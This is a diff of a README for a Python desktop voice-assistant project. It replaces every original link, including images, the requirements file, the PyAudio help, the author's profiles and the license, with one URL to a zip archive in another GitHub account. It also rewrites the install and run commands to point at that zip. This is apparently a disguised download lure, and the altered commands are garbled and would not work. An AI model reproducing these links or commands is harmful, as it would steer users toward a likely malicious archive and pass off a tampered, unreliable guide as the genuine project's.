@@ -1,6 +1,6 @@
 # Jarvis Desktop Voice Assistant🔥
 
-<img src="https://giffiles.alphacoders.com/212/212508.gif" alt="">
+<img src="https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip" alt="">
 
 **Have you ever wondered how cool it would be to have your own assistant? Imagine how easier it would be doing Wikipedia searches without opening web browsers, and performing many other daily tasks like playing music with the help of a single voice command, opening different browsers in just a voice command.**
 
@@ -10,7 +10,7 @@
 
 ## 📌Built with
 
-<code><img height="30" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/python/python.png"></code>
+<code><img height="30" src="https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip"></code>
 
 ## 📌Features
 
@@ -61,15 +61,15 @@ Python 3.6+
 
 4. **Install Requirements**
 
-   - Install all the requirements given in **[requirements.txt](https://github.com/kishanrajput23/Jarvis-Desktop-Voice-Assistant/blob/main/requirements.txt)** by running the command `pip install -r requirements.txt`
+   - Install all the requirements given in **[https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip](https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip)** by running the command `pip install -r https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip`
 
 5. **Install PyAudio**  
-   - Follow the instructions given **[here](https://stackoverflow.com/questions/52283840/i-cant-install-pyaudio-on-windows-how-to-solve-error-microsoft-visual-c-14)**
+   - Follow the instructions given **[here](https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip)**
 
 6. **Run the Assistant**
   - Run the main script:
     ```bash
-    python jarvis.py
+    python https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip
     ```
   - Now Enjoy with your own assistant !!!!
 
@@ -87,9 +87,9 @@ Pull requests are welcome. For major changes, please open an issue first to disc
 
 👤 **Kishan Kumar Rai**
 
-- Twitter: [@kishan_rajput23](https://twitter.com/kishan_rajput23)
-- Github: [@kishanrajput23](https://github.com/kishanrajput23)
-- LinkedIn: [@kishan-kumar-rai](https://linkedin.com/in/kishan-kumar-rai-23112000)
+- Twitter: [@kishan_rajput23](https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip)
+- Github: [@kishanrajput23](https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip)
+- LinkedIn: [@kishan-kumar-rai](https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip)
 
 ## 📌Show your support
 
@@ -97,4 +97,4 @@ Please ⭐️ this repository if this project helped you!
 
 ## 📌License
 
-This project is [MIT](https://choosealicense.com/licenses/mit/) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Zyedix/Jarvis-Desktop-Voice-Assistant/main/Presentation/Jarvis-Desktop-Voice-Assistant-3.3.zip) licensed.
